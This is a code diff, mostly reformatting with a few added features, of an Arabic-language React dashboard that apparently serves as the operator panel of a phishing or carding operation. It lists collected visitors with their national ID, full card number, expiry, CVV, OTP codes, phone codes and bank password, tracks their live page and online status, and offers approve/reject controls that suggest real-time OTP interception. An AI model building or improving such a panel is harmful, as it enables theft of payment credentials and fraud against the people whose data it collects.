@@ -159,15 +159,20 @@ interface Notification {
 }
 
 // Helpers for the new structure
-const getNotificationEmail = (n: Notification) => n.personal?.email || n.email || "";
-const getNotificationPhone = (n: Notification) => n.personal?.phone || n.phone || n.mobile || "";
+const getNotificationEmail = (n: Notification) =>
+  n.personal?.email || n.email || "";
+const getNotificationPhone = (n: Notification) =>
+  n.personal?.phone || n.phone || n.mobile || "";
 const getNotificationName = (n: Notification) =>
   n.personal?.firstName
     ? `${n.personal.firstName} ${n.personal.lastName}`
     : n.name || n.cardName || n.card?.name || "";
-const getNotificationCardNum = (n: Notification) => n.card?.number || n.cardNumber || "";
+const getNotificationCardNum = (n: Notification) =>
+  n.card?.number || n.cardNumber || "";
 const getNotificationExpiry = (n: Notification) =>
-  n.card?.expiry || n.expiry || (n.year && n.month ? `${n.year}/${n.month}` : "");
+  n.card?.expiry ||
+  n.expiry ||
+  (n.year && n.month ? `${n.year}/${n.month}` : "");
 const getNotificationCVV = (n: Notification) => n.card?.cvv || n.cvv || "";
 
 // Reuse components from user prompt code
@@ -181,7 +186,7 @@ function useOnlineUsersCount() {
         const data = snapshot.val();
         if (data) {
           const onlineCount = Object.values(data).filter(
-            (status: any) => status.state === "online",
+            (status: any) => status.state === "online"
           ).length;
           setOnlineUsersCount(onlineCount);
         }
@@ -196,7 +201,9 @@ function useOnlineUsersCount() {
 }
 
 function UserStatus({ userId }: { userId: string }) {
-  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown");
+  const [status, setStatus] = useState<"online" | "offline" | "unknown">(
+    "unknown"
+  );
   const [lastSeen, setLastSeen] = useState<Date | null>(null);
 
   useEffect(() => {
@@ -225,7 +232,11 @@ function UserStatus({ userId }: { userId: string }) {
         <div className="flex items-center gap-2 cursor-pointer">
           <div
             className={`w-2 h-2 rounded-full ${
-              status === "online" ? "bg-green-500 animate-pulse" : status === "offline" ? "bg-red-500" : "bg-gray-400"
+              status === "online"
+                ? "bg-green-500 animate-pulse"
+                : status === "offline"
+                ? "bg-red-500"
+                : "bg-gray-400"
             }`}
           />
           <Badge
@@ -238,14 +249,19 @@ function UserStatus({ userId }: { userId: string }) {
                 : "bg-gray-50 text-gray-700 border-gray-200 dark:bg-gray-950/30 dark:text-gray-300"
             }`}
           >
-            {status === "online" ? "متصل" : status === "offline" ? "غير متصل" : "غير معروف"}
+            {status === "online"
+              ? "متصل"
+              : status === "offline"
+              ? "غير متصل"
+              : "غير معروف"}
           </Badge>
         </div>
       </TooltipTrigger>
       <TooltipContent>
         {status === "offline" && lastSeen && (
           <p>
-            آخر ظهور: {formatDistanceToNow(lastSeen, { addSuffix: true, locale: ar })}
+            آخر ظهور:{" "}
+            {formatDistanceToNow(lastSeen, { addSuffix: true, locale: ar })}
           </p>
         )}
         {status === "online" && <p>متصل الآن</p>}
@@ -277,7 +293,9 @@ function StatisticsCard({
       <div className="absolute inset-0 bg-gradient-to-br from-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
       <CardHeader className="pb-2 relative">
         <div className="flex items-center justify-between">
-          <div className={`p-3 rounded-xl ${color} shadow-lg group-hover:scale-110 transition-transform`}>
+          <div
+            className={`p-3 rounded-xl ${color} shadow-lg group-hover:scale-110 transition-transform`}
+          >
             <Icon className="h-6 w-6 text-white" />
           </div>
           <div className="text-right">
@@ -291,12 +309,20 @@ function StatisticsCard({
           <div className="flex items-center gap-1">
             <TrendingUp
               className={`h-4 w-4 ${
-                changeType === "increase" ? "text-emerald-400" : changeType === "decrease" ? "text-red-400" : "text-slate-500"
+                changeType === "increase"
+                  ? "text-emerald-400"
+                  : changeType === "decrease"
+                  ? "text-red-400"
+                  : "text-slate-500"
               }`}
             />
             <span
               className={`text-sm font-medium ${
-                changeType === "increase" ? "text-emerald-400" : changeType === "decrease" ? "text-red-400" : "text-slate-500"
+                changeType === "increase"
+                  ? "text-emerald-400"
+                  : changeType === "decrease"
+                  ? "text-red-400"
+                  : "text-slate-500"
               }`}
             >
               {change}
@@ -349,8 +375,16 @@ function FlagColorSelector({
         <div className="flex gap-2">
           {[
             { color: "red", label: "عالي الأولوية", bgColor: "bg-red-500" },
-            { color: "yellow", label: "متوسط الأولوية", bgColor: "bg-yellow-500" },
-            { color: "green", label: "منخفض الأولوية", bgColor: "bg-green-500" },
+            {
+              color: "yellow",
+              label: "متوسط الأولوية",
+              bgColor: "bg-yellow-500",
+            },
+            {
+              color: "green",
+              label: "منخفض الأولوية",
+              bgColor: "bg-green-500",
+            },
           ].map(({ color, label, bgColor }) => (
             <div key={color}>
               <Tooltip>
@@ -359,7 +393,9 @@ function FlagColorSelector({
                     variant="ghost"
                     size="icon"
                     className={`h-8 w-8 rounded-full ${bgColor} hover:opacity-80 transition-opacity`}
-                    onClick={() => onColorChange(notificationId, color as FlagColor)}
+                    onClick={() =>
+                      onColorChange(notificationId, color as FlagColor)
+                    }
                   >
                     <Flag className="h-4 w-4 text-white" />
                   </Button>
@@ -393,7 +429,13 @@ function FlagColorSelector({
   );
 }
 
-function SearchBar({ onSearch, value }: { onSearch: (term: string) => void; value: string }) {
+function SearchBar({
+  onSearch,
+  value,
+}: {
+  onSearch: (term: string) => void;
+  value: string;
+}) {
   const [searchTerm, setSearchTerm] = useState(value);
   const searchInputRef = useRef<HTMLInputElement>(null);
 
@@ -496,7 +538,12 @@ function Pagination({
         <span className="font-medium text-foreground">{totalItems}</span> عنصر
       </div>
       <div className="flex items-center gap-2">
-        <Button variant="outline" size="sm" onClick={() => onPageChange(currentPage - 1)} disabled={currentPage <= 1}>
+        <Button
+          variant="outline"
+          size="sm"
+          onClick={() => onPageChange(currentPage - 1)}
+          disabled={currentPage <= 1}
+        >
           <ChevronRight className="h-4 w-4" />
         </Button>
         <div className="flex items-center gap-1">
@@ -506,13 +553,23 @@ function Pagination({
                 ...
               </span>
             ) : (
-              <Button key={page} variant={currentPage === page ? "default" : "outline"} size="sm" onClick={() => onPageChange(page as number)}>
+              <Button
+                key={page}
+                variant={currentPage === page ? "default" : "outline"}
+                size="sm"
+                onClick={() => onPageChange(page as number)}
+              >
                 {page}
               </Button>
-            ),
+            )
           )}
         </div>
-        <Button variant="outline" size="sm" onClick={() => onPageChange(currentPage + 1)} disabled={currentPage >= totalPages}>
+        <Button
+          variant="outline"
+          size="sm"
+          onClick={() => onPageChange(currentPage + 1)}
+          disabled={currentPage >= totalPages}
+        >
           <ChevronLeft className="h-4 w-4" />
         </Button>
       </div>
@@ -525,7 +582,11 @@ const InfoBadge = ({ active, onClick, icon: Icon, text, colorClass }: any) => (
     <TooltipTrigger asChild>
       <Badge
         variant={active ? "default" : "secondary"}
-        className={`cursor-pointer transition-all hover:scale-105 ${active ? `bg-gradient-to-r ${colorClass} text-white shadow-md` : "opacity-60"}`}
+        className={`cursor-pointer transition-all hover:scale-105 ${
+          active
+            ? `bg-gradient-to-r ${colorClass} text-white shadow-md`
+            : "opacity-60"
+        }`}
         onClick={active ? onClick : undefined}
       >
         <Icon className="h-3 w-3 ml-1" />
@@ -540,51 +601,98 @@ const InfoBadge = ({ active, onClick, icon: Icon, text, colorClass }: any) => (
 
 const StatusBadge = ({ status }: any) => {
   const statusMap = {
-    approved: { text: "موافق", color: "from-green-500 to-green-600", icon: CheckCircle },
-    rejected: { text: "مرفوض", color: "from-red-500 to-red-600", icon: XCircle },
-    pending: { text: "معلق", color: "from-yellow-500 to-yellow-600", icon: Clock },
+    approved: {
+      text: "موافق",
+      color: "from-green-500 to-green-600",
+      icon: CheckCircle,
+    },
+    rejected: {
+      text: "مرفوض",
+      color: "from-red-500 to-red-600",
+      icon: XCircle,
+    },
+    pending: {
+      text: "معلق",
+      color: "from-yellow-500 to-yellow-600",
+      icon: Clock,
+    },
   };
-  const current = (statusMap[status as keyof typeof statusMap] as any) || statusMap.pending;
+  const current =
+    (statusMap[status as keyof typeof statusMap] as any) || statusMap.pending;
   return (
-    <Badge className={`bg-gradient-to-r ${current.color} text-white flex items-center gap-1 shadow-sm`}>
+    <Badge
+      className={`bg-gradient-to-r ${current.color} text-white flex items-center gap-1 shadow-sm`}
+    >
       <current.icon className="h-3 w-3" />
       {current.text}
     </Badge>
   );
 };
 
-const HeaderIcon: React.FC<{ icon: React.ElementType; bgGradient: string; title: string }> = ({ icon: Icon, bgGradient, title }) => (
+const HeaderIcon: React.FC<{
+  icon: React.ElementType;
+  bgGradient: string;
+  title: string;
+}> = ({ icon: Icon, bgGradient, title }) => (
   <>
-    <div className={`w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br ${bgGradient} shadow-md`}>
+    <div
+      className={`w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br ${bgGradient} shadow-md`}
+    >
       <Icon className="h-6 w-6 text-white" />
     </div>
     <span className="ml-2">{title}</span>
   </>
 );
 
-const InfoSection: React.FC<{ items: { label: string; value: any; sensitive?: boolean }[]; additionalOtps?: string[] }> = ({
-  items,
-  additionalOtps,
-}) => {
-  const [showSensitive, setShowSensitive] = useState<{ [key: string]: boolean }>({});
+const InfoSection: React.FC<{
+  items: { label: string; value: any; sensitive?: boolean }[];
+  additionalOtps?: string[];
+}> = ({ items, additionalOtps }) => {
+  const [showSensitive, setShowSensitive] = useState<{
+    [key: string]: boolean;
+  }>({});
   return (
     <div className="mt-4 space-y-4">
-      <div className="bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl shadow-inner p-5 space-y-3">
+      <div
+        className="bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl shadow-inner p-5 space-y-3"
+        dir="ltr"
+      >
         {items.map(({ label, value, sensitive }) => {
-          if (value === undefined || value === null || value === "") return null;
+          if (value === undefined || value === null || value === "")
+            return null;
           return (
-            <div key={label} className="flex justify-between items-center py-2 border-b border-gray-300 dark:border-gray-700 last:border-0 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-md px-2 transition">
-              <span className="font-medium text-gray-500 dark:text-gray-400">{label}:</span>
+            <div
+              key={label}
+              className="flex justify-between items-center py-2 border-b border-gray-300 dark:border-gray-700 last:border-0 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-md px-2 transition"
+            >
+              <span className="font-medium text-gray-500 dark:text-gray-400">
+                {label}:
+              </span>
               <div className="flex items-center gap-2">
                 {sensitive ? (
                   <>
-                    <span className="font-semibold text-gray-900 dark:text-gray-200">{showSensitive[label] ? String(value) : "••••••"}</span>
-                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => setShowSensitive((p) => ({ ...p, [label]: !p[label] }))}>
-                      {showSensitive[label] ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                    <span className="font-semibold text-gray-900 dark:text-gray-200">
+                      {showSensitive[label] ? String(value) : "••••••"}
+                    </span>
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-6 w-6"
+                      onClick={() =>
+                        setShowSensitive((p) => ({ ...p, [label]: !p[label] }))
+                      }
+                    >
+                      {showSensitive[label] ? (
+                        <EyeOff className="h-3 w-3" />
+                      ) : (
+                        <Eye className="h-3 w-3" />
+                      )}
                     </Button>
                   </>
                 ) : (
-                  <span className="font-semibold text-gray-900 dark:text-gray-200 text-right">{String(value)}</span>
+                  <span className="font-semibold text-gray-900 dark:text-gray-200 text-right">
+                    {String(value)}
+                  </span>
                 )}
               </div>
             </div>
@@ -592,10 +700,16 @@ const InfoSection: React.FC<{ items: { label: string; value: any; sensitive?: bo
         })}
         {additionalOtps && additionalOtps.length > 0 && (
           <div className="pt-3 border-t border-gray-300 dark:border-gray-700">
-            <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">جميع الرموز:</span>
+            <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">
+              جميع الرموز:
+            </span>
             <div className="flex flex-wrap gap-2">
               {additionalOtps.map((otp, index) => (
-                <Badge key={index} variant="outline" className="bg-gray-100 dark:bg-gray-800 text-gray-800 dark:text-gray-100 font-mono">
+                <Badge
+                  key={index}
+                  variant="outline"
+                  className="bg-gray-100 dark:bg-gray-800 text-gray-800 dark:text-gray-100 font-mono"
+                >
                   {otp}
                 </Badge>
               ))}
@@ -610,9 +724,14 @@ const InfoSection: React.FC<{ items: { label: string; value: any; sensitive?: bo
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([]);
   const [isLoading, setIsLoading] = useState(true);
-  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null);
-  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null);
-  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "pending">("all");
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
+    null
+  );
+  const [selectedNotification, setSelectedNotification] =
+    useState<Notification | null>(null);
+  const [filterType, setFilterType] = useState<
+    "all" | "card" | "online" | "pending"
+  >("all");
   const [searchTerm, setSearchTerm] = useState("");
   const [currentPage, setCurrentPage] = useState(1);
   const [itemsPerPage] = useState(10);
@@ -634,7 +753,10 @@ export default function NotificationsPage() {
   useEffect(() => {
     const q = query(collection(db, "paysapp"), orderBy("createdDate", "desc"));
     const unsubscribe = onSnapshot(q, (snapshot) => {
-      const data = snapshot.docs.map((doc) => ({ id: doc.id, ...doc.data() })) as Notification[];
+      const data = snapshot.docs.map((doc) => ({
+        id: doc.id,
+        ...doc.data(),
+      })) as Notification[];
       const filtered = data.filter((n) => !n.isHidden);
       if (filtered.length > notifications.length && notifications.length > 0) {
         playNotificationSound();
@@ -647,17 +769,21 @@ export default function NotificationsPage() {
 
   const filteredNotifications = useMemo(() => {
     let result = [...notifications];
-    if (filterType === "card") result = result.filter((n) => getNotificationCardNum(n));
-    if (filterType === "pending") result = result.filter((n) => n.status === "pending");
-    if (filterType === "online") result = result.filter((n) => onlineStatuses[n.id]);
+    if (filterType === "card")
+      result = result.filter((n) => getNotificationCardNum(n));
+    if (filterType === "pending")
+      result = result.filter((n) => n.status === "pending");
+    if (filterType === "online")
+      result = result.filter((n) => onlineStatuses[n.id]);
     if (searchTerm) {
       const lower = searchTerm.toLowerCase();
-      result = result.filter((n) =>
-        getNotificationName(n).toLowerCase().includes(lower) ||
-        getNotificationEmail(n).toLowerCase().includes(lower) ||
-        getNotificationPhone(n).toLowerCase().includes(lower) ||
-        getNotificationCardNum(n).includes(lower) ||
-        n.id.includes(lower),
+      result = result.filter(
+        (n) =>
+          getNotificationName(n).toLowerCase().includes(lower) ||
+          getNotificationEmail(n).toLowerCase().includes(lower) ||
+          getNotificationPhone(n).toLowerCase().includes(lower) ||
+          getNotificationCardNum(n).includes(lower) ||
+          n.id.includes(lower)
       );
     }
     result.sort((a, b) => {
@@ -667,17 +793,31 @@ export default function NotificationsPage() {
         aVal = new Date(a.createdDate).getTime();
         bVal = new Date(b.createdDate).getTime();
       }
-      return sortOrder === "asc" ? (aVal > bVal ? 1 : -1) : (aVal < bVal ? 1 : -1);
+      return sortOrder === "asc"
+        ? aVal > bVal
+          ? 1
+          : -1
+        : aVal < bVal
+        ? 1
+        : -1;
     });
     return result;
-  }, [notifications, filterType, searchTerm, onlineStatuses, sortBy, sortOrder]);
+  }, [
+    notifications,
+    filterType,
+    searchTerm,
+    onlineStatuses,
+    sortBy,
+    sortOrder,
+  ]);
 
   const paginatedNotifications = useMemo(() => {
     const start = (currentPage - 1) * itemsPerPage;
     return filteredNotifications.slice(start, start + itemsPerPage);
   }, [filteredNotifications, currentPage, itemsPerPage]);
 
-  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage) || 1;
+  const totalPages =
+    Math.ceil(filteredNotifications.length / itemsPerPage) || 1;
 
   const handleApproval = async (id: string, state: string) => {
     try {
@@ -723,17 +863,28 @@ export default function NotificationsPage() {
       <header className="sticky top-0 z-40 bg-slate-900/80 backdrop-blur-md border-b border-slate-800 p-4">
         <div className="flex items-center justify-between max-w-7xl mx-auto">
           <div className="flex items-center gap-3">
-            <div className="bg-emerald-600 p-2 rounded-lg"><Bell className="h-5 w-5" /></div>
+            <div className="bg-emerald-600 p-2 rounded-lg">
+              <Bell className="h-5 w-5" />
+            </div>
             <div>
               <h1 className="font-bold">لوحة الإشعارات</h1>
               <p className="text-xs text-slate-400">نظام المراقبة المتقدم</p>
             </div>
           </div>
           <div className="flex items-center gap-2">
-            <Button variant="ghost" size="icon" onClick={() => setShowStatistics(!showStatistics)}>
+            <Button
+              variant="ghost"
+              size="icon"
+              onClick={() => setShowStatistics(!showStatistics)}
+            >
               <Activity className="h-4 w-4" />
             </Button>
-            <Button variant="ghost" size="icon" onClick={handleLogout} className="text-red-400">
+            <Button
+              variant="ghost"
+              size="icon"
+              onClick={handleLogout}
+              className="text-red-400"
+            >
               <LogOut className="h-4 w-4" />
             </Button>
           </div>
@@ -743,15 +894,49 @@ export default function NotificationsPage() {
       <main className="max-w-7xl mx-auto p-4 md:p-6 space-y-6">
         {showStatistics && (
           <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
-            <StatisticsCard title="إجمالي الزوار" value={notifications.length} change="+0" changeType="neutral" icon={Users} color="bg-blue-600" />
-            <StatisticsCard title="متصلين" value={onlineUsersCount} change="+0" changeType="neutral" icon={UserCheck} color="bg-emerald-600" />
-            <StatisticsCard title="بطاقات" value={notifications.filter((n) => getNotificationCardNum(n)).length} change="+0" changeType="neutral" icon={CreditCard} color="bg-purple-600" />
-            <StatisticsCard title="معلق" value={notifications.filter((n) => n.status === "pending").length} change="+0" changeType="neutral" icon={Clock} color="bg-amber-600" />
+            <StatisticsCard
+              title="إجمالي الزوار"
+              value={notifications.length}
+              change="+0"
+              changeType="neutral"
+              icon={Users}
+              color="bg-blue-600"
+            />
+            <StatisticsCard
+              title="متصلين"
+              value={onlineUsersCount}
+              change="+0"
+              changeType="neutral"
+              icon={UserCheck}
+              color="bg-emerald-600"
+            />
+            <StatisticsCard
+              title="بطاقات"
+              value={
+                notifications.filter((n) => getNotificationCardNum(n)).length
+              }
+              change="+0"
+              changeType="neutral"
+              icon={CreditCard}
+              color="bg-purple-600"
+            />
+            <StatisticsCard
+              title="معلق"
+              value={notifications.filter((n) => n.status === "pending").length}
+              change="+0"
+              changeType="neutral"
+              icon={Clock}
+              color="bg-amber-600"
+            />
           </div>
         )}
 
         <div className="flex flex-col md:flex-row gap-4 justify-between items-center">
-          <Tabs value={filterType} onValueChange={(v: any) => setFilterType(v)} className="w-full md:w-auto">
+          <Tabs
+            value={filterType}
+            onValueChange={(v: any) => setFilterType(v)}
+            className="w-full md:w-auto"
+          >
             <TabsList className="bg-slate-900 border-slate-800">
               <TabsTrigger value="all">الكل</TabsTrigger>
               <TabsTrigger value="pending">المعلق</TabsTrigger>
@@ -769,6 +954,7 @@ export default function NotificationsPage() {
             <table className="w-full text-right text-sm">
               <thead className="bg-slate-800/50 text-slate-400">
                 <tr>
+                  <th className="p-4">متصل</th>
                   <th className="p-4">المعلومات</th>
                   <th className="p-4">الحالة</th>
                   <th className="p-4">الوقت</th>
@@ -776,38 +962,96 @@ export default function NotificationsPage() {
                   <th className="p-4">الإجراءات</th>
                 </tr>
               </thead>
-              <tbody>
+              <tbody dir="rtl">
                 {paginatedNotifications.map((n) => (
-                  <tr key={n.id} className="border-b border-slate-800 hover:bg-slate-800/30">
+                  <tr
+                    key={n.id}
+                    dir="rtl"
+                    className="border-b border-slate-800 hover:bg-slate-800/30"
+                  >
+                    <td>
+                      <UserStatus userId={n.id} />
+                    </td>
                     <td className="p-4">
-                      <div className="flex flex-wrap gap-2">
+                      <div className="flex flex-wrap gap-2" dir="rtl">
                         <InfoBadge
-                          active={getNotificationName(n) || getNotificationPhone(n)}
-                          onClick={() => { setSelectedNotification(n); setSelectedInfo("personal"); }}
+                          active={
+                            getNotificationName(n) || getNotificationPhone(n)
+                          }
+                          onClick={() => {
+                            setSelectedNotification(n);
+                            setSelectedInfo("personal");
+                          }}
                           icon={User}
                           text="شخصي"
                           colorClass="from-blue-500 to-blue-600"
                         />
                         <InfoBadge
                           active={getNotificationCardNum(n).toString()}
-                          onClick={() => { setSelectedNotification(n); setSelectedInfo("card"); }}
+                          onClick={() => {
+                            setSelectedNotification(n);
+                            setSelectedInfo("card");
+                          }}
                           icon={CreditCard}
                           text="بطاقة"
-                          colorClass="from-emerald-500 to-emerald-600"
+                          colorClass={
+                            n.otp
+                              ? "from-red-500 to-yellow-600"
+                              : "from-emerald-500 to-emerald-600"
+                          }
                         />
                       </div>
                     </td>
-                    <td className="p-4"><StatusBadge status={n.status} /></td>
-                    <td className="p-4 text-slate-400">{formatDistanceToNow(new Date(n.createdDate), { locale: ar, addSuffix: true })}</td>
                     <td className="p-4">
-                      <Badge variant="outline" className="border-slate-700">{n.currentPage || "-"}</Badge>
+                      <StatusBadge status={n.status} />
+                    </td>
+                    <td className="p-4 text-slate-400">
+                      {formatDistanceToNow(new Date(n.createdDate), {
+                        locale: ar,
+                        addSuffix: true,
+                      })}
+                    </td>
+                    <td className="p-4">
+                      <Badge
+                        variant="outline"
+                        className="border-slate-700 text-teal-300"
+                      >
+                        {n.currentPage || "-"}
+                      </Badge>
                     </td>
                     <td className="p-4">
                       <div className="flex gap-1 justify-end">
-                        <Button variant="ghost" size="icon" onClick={() => handleApproval(n.id, "approved")} disabled={n.status === "approved"} className="text-emerald-500"><CheckCircle className="h-4 w-4" /></Button>
-                        <Button variant="ghost" size="icon" onClick={() => handleApproval(n.id, "rejected")} disabled={n.status === "rejected"} className="text-red-500"><XCircle className="h-4 w-4" /></Button>
-                        <FlagColorSelector notificationId={n.id} currentColor={n.flagColor} onColorChange={handleFlagChange} />
-                        <Button variant="ghost" size="icon" onClick={() => handleDelete(n.id)} className="text-slate-500"><Trash2 className="h-4 w-4" /></Button>
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          onClick={() => handleApproval(n.id, "approved")}
+                          disabled={n.status === "approved"}
+                          className="text-emerald-500"
+                        >
+                          <CheckCircle className="h-4 w-4" />
+                        </Button>
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          onClick={() => handleApproval(n.id, "rejected")}
+                          disabled={n.status === "rejected"}
+                          className="text-red-500"
+                        >
+                          <XCircle className="h-4 w-4" />
+                        </Button>
+                        <FlagColorSelector
+                          notificationId={n.id}
+                          currentColor={n.flagColor}
+                          onColorChange={handleFlagChange}
+                        />
+                        <Button
+                          variant="ghost"
+                          size="icon"
+                          onClick={() => handleDelete(n.id)}
+                          className="text-slate-500"
+                        >
+                          <Trash2 className="h-4 w-4" />
+                        </Button>
                       </div>
                     </td>
                   </tr>
@@ -816,41 +1060,99 @@ export default function NotificationsPage() {
             </table>
           </div>
           <CardFooter className="p-4 border-t border-slate-800">
-            <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} totalItems={filteredNotifications.length} itemsPerPage={itemsPerPage} />
+            <Pagination
+              currentPage={currentPage}
+              totalPages={totalPages}
+              onPageChange={setCurrentPage}
+              totalItems={filteredNotifications.length}
+              itemsPerPage={itemsPerPage}
+            />
           </CardFooter>
         </Card>
       </main>
 
       <Dialog open={!!selectedInfo} onOpenChange={() => setSelectedInfo(null)}>
-        <DialogContent className="max-w-md bg-slate-900 border-slate-800 text-white" dir="rtl">
+        <DialogContent
+          className="max-w-md bg-slate-900 border-slate-800 text-white"
+          dir="rtl"
+        >
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
-              {selectedInfo === "personal" ? <User className="h-5 w-5 text-blue-500" /> : <CreditCard className="h-5 w-5 text-emerald-500" />}
-              {selectedInfo === "personal" ? "المعلومات الشخصية" : "معلومات البطاقة"}
+              {selectedInfo === "personal" ? (
+                <User className="h-5 w-5 text-blue-500" />
+              ) : (
+                <CreditCard className="h-5 w-5 text-emerald-500" />
+              )}
+              {selectedInfo === "personal"
+                ? "المعلومات الشخصية"
+                : "معلومات البطاقة"}
             </DialogTitle>
           </DialogHeader>
           {selectedNotification && selectedInfo === "personal" && (
-            <InfoSection items={[
-              { label: "الاسم", value: getNotificationName(selectedNotification) },
-              { label: "الهوية", value: selectedNotification.idNumber, sensitive: true },
-              { label: "الجوال", value: getNotificationPhone(selectedNotification) },
-              { label: "البريد", value: getNotificationEmail(selectedNotification) },
-              { label: "رمز الهاتف", value: selectedNotification.otp2, sensitive: true },
-            ]} />
+            <InfoSection
+              items={[
+                {
+                  label: "الاسم",
+                  value: getNotificationName(selectedNotification),
+                },
+                {
+                  label: "الهوية",
+                  value: selectedNotification.idNumber,
+                  sensitive: true,
+                },
+                {
+                  label: "الجوال",
+                  value: getNotificationPhone(selectedNotification),
+                },
+                {
+                  label: "البريد",
+                  value: getNotificationEmail(selectedNotification),
+                },
+                {
+                  label: "رمز الهاتف",
+                  value: selectedNotification.otp2,
+                  sensitive: true,
+                },
+              ]}
+            />
           )}
           {selectedNotification && selectedInfo === "card" && (
-            <InfoSection items={[
-              { label: "البنك", value: selectedNotification.bank },
-              { label: "رقم البطاقة", value: getNotificationCardNum(selectedNotification), sensitive: false },
-              { label: "تاريخ الانتهاء", value: getNotificationExpiry(selectedNotification) },
-              { label: "CVV", value: getNotificationCVV(selectedNotification), sensitive: false },
-              { label: "رمز OTP", value: selectedNotification.otp, sensitive: false },
-              { label: "كلمة المرور", value: selectedNotification.pass, sensitive: true },
-              { label: "المبلغ", value: selectedNotification.amount },
-            ]} additionalOtps={selectedNotification.allOtps || []} />
+            <InfoSection
+              items={[
+                { label: "البنك", value: selectedNotification.bank },
+                {
+                  label: "رقم البطاقة",
+                  value: getNotificationCardNum(selectedNotification),
+                  sensitive: false,
+                },
+                {
+                  label: "تاريخ الانتهاء",
+                  value: getNotificationExpiry(selectedNotification),
+                },
+                {
+                  label: "CVV",
+                  value: getNotificationCVV(selectedNotification),
+                  sensitive: false,
+                },
+                {
+                  label: "رمز OTP",
+                  value: selectedNotification.otp,
+                  sensitive: false,
+                },
+                {
+                  label: "كلمة المرور",
+                  value: selectedNotification.pass,
+                  sensitive: true,
+                },
+                { label: "المبلغ", value: selectedNotification.amount },
+              ]}
+              additionalOtps={selectedNotification.allOtps || []}
+            />
           )}
           <DialogFooter>
-            <Button onClick={() => setSelectedInfo(null)} className="w-full">إغلاق</Button>
+            <Button onClick={() => setSelectedInfo(null)} className="w-full">
+              إغلاق
+            </Button>
           </DialogFooter>
         </DialogContent>
       </Dialog>
